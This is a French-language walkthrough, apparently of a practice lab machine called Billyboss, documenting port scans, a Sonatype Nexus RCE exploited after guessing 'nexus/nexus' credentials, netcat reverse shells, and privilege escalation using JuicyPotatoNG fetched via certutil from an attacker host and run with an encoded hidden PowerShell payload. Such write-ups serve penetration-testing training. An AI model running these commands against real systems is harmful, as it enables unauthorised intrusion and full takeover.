# Billyboss

	sudo masscan -p1-65535,U:1-65535 192.168.198.61 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.198.61 -oN nmap.txt
	feroxbuster --silent -u http://192.168.198.61
	
Scans classiques.

    PORT STATE SERVICE VERSION  
    21/tcp open ftp Microsoft ftpd  
    80/tcp open http Microsoft IIS httpd 10.0  
    135/tcp open msrpc Microsoft Windows RPC  
    139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
    445/tcp open microsoft-ds?  
    5040/tcp open unknown  
    8081/tcp open http Jetty 9.4.18.v20190429  
    49664/tcp open msrpc Microsoft Windows RPC  
    49665/tcp open msrpc Microsoft Windows RPC  
    49666/tcp open msrpc Microsoft Windows RPC  
    49667/tcp open msrpc Microsoft Windows RPC  
    49668/tcp open msrpc Microsoft Windows RPC  
    49669/tcp open msrpc Microsoft Windows RPC

Il y a un système d'upload de paquets avec l'URL http://192.168.198.61/v3/index.json mais cela semble solide.

En revanche le port 8081 héberge un site qui semble vulnérable à une RCE : https://www.exploit-db.com/exploits/49385 

Le problème est que cet exploit nécessite d'être authentifié, mais j'ai eu l'indice qu'il fallait faire du guessing sur ce point.  Les credentials par défaut et les variantes n'ont pas fonctionné. 
</br>Après un plus gros indice j'ai fini par trouver : c'est tout simplement "nexus" / "nexus"

Il n'y a plus qu'à exploiter, en remplaçant bien les credentials ainsi que la commande dans l'exploit : 

	python ~/000_exploits/exploit_Sonatype-Nexus_RCE.py 
	...
	rlwrap nc -nvlp 443
	type C:\Users\nathan\Desktop\local.txt
	
Élévation de privilèges classique avec une Potato : 

	certutil.exe -urlcache -f http://192.168.45.236/JuicyPotatoNG.exe ./JuicyPotatoNG.exe
	./JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c powershell -nop -w hidden -e JABjAGwAaQB...ACgAKQA="
	...
	rlwrap nc -nvlp 443
	type C:\Users\Administrator\Desktop\proof.txt



